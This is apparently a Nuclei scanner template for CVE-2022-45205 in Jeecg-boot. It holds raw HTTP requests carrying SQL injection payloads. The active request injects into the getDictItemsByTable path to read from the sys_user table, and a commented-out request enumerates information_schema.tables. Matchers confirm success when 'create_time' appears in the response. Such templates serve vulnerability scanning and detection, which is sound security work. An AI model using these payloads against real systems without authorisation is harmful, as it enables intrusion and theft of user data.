id: jeecg-boot-queryTableData-sqli

info:
  name: Jeecg-boot-queryTableData-sqli
  author: M9
  severity: high
  tags: CVE-2022-45205

http:
  # - raw:
  #     - |-
  #       GET /sys/dict/queryTableData?pageSize=100&table=information_schema.tables&text=table_name&code=TABLE_SCHEMA HTTP/1.1
  #       Host: {{Hostname}}
  #       User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
  #       Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  #       Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  #       Accept-Encoding: gzip, deflate
  #       Connection: close
  #       Upgrade-Insecure-Requests: 1
  #       Sec-Fetch-Dest: document
  #       Sec-Fetch-Mode: navigate
  #       Sec-Fetch-Site: none
  #       Sec-Fetch-User: ?1

  #   matchers:
  #     - type: dsl
  #       dsl:
  #         - 'status_code == 200'
  #         - 'contains(body, "create_time")'
  #       condition: and

  - raw:
      - |-
        GET /sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: none
        Sec-Fetch-User: ?1

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "create_time")'
        condition: and
